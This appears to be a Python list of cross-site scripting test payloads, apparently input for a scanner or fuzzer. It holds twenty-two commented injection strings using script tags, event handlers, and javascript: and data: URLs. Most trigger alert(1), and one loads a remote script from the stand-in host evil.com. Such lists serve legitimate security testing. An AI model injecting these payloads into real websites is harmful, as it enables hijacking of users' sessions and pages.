xss_payloads = [
    "<script>alert(1)</script>",            # Classic XSS payload
    "<img src=x onerror=alert(1)>",         # Image error-based XSS
    "<svg onload=alert(1)>",                # SVG onload event-based XSS
    "<body onload=alert(1)>",               # Body onload event-based XSS
    "<iframe src=javascript:alert(1)>",     # Iframe JavaScript-based XSS
    "<math href=x onmouseover=alert(1)>X</math>",  # Math element event-based XSS
    "<a href='javascript:alert(1)'>Click me</a>",   # JavaScript link-based XSS
    "<input type='text' value=''><img src=x onerror=alert(1)>",  # Input + Image XSS
    "<svg><script>alert(1)</script></svg>",  # SVG with embedded script XSS
    "<video src='x' onerror='alert(1)'></video>",  # Video onerror-based XSS
    "<audio src='x' onerror='alert(1)'></audio>",  # Audio onerror-based XSS
    "<object data='x' onload='alert(1)'></object>",  # Object tag XSS
    "<marquee onstart='alert(1)'>XSS</marquee>",  # Marquee tag XSS
    "<style>body{background-image:url('javascript:alert(1)');}</style>",  # CSS-based XSS
    "<div onmouseover='alert(1)'>Hover me</div>",  # Div hover-based XSS
    "<script src='http://evil.com/malicious.js'></script>",  # External script XSS
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",  # srcdoc iframe XSS
    "<object data='data:image/svg+xml;base64,PHN2ZyBvbm...'></object>",  # Base64 embedded SVG in object XSS
    "<input type='text' onfocus='alert(1)'>",  # Input focus-based XSS
    "<details open ontoggle='alert(1)'><summary>Click</summary></details>",  # Details toggle-based XSS
    "<form action='javascript:alert(1)'><button>Submit</button></form>",  # Form XSS
    "<a href='data:text/html,<script>alert(1)</script>'>Click</a>",  # Data URL XSS
]
